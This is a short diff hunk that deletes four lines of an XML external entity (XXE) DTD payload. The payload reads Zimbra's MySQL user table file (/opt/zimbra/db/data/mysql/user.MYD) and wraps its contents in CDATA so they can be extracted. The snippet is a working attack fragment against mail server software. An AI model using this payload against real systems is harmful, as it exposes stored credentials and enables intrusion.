@@ -1,4 +1,0 @@
-<!ENTITY % file SYSTEM "file:/opt/zimbra/db/data/mysql/user.MYD">
-<!ENTITY % start "<![CDATA[">
-<!ENTITY % end "]]>">
-<!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>">
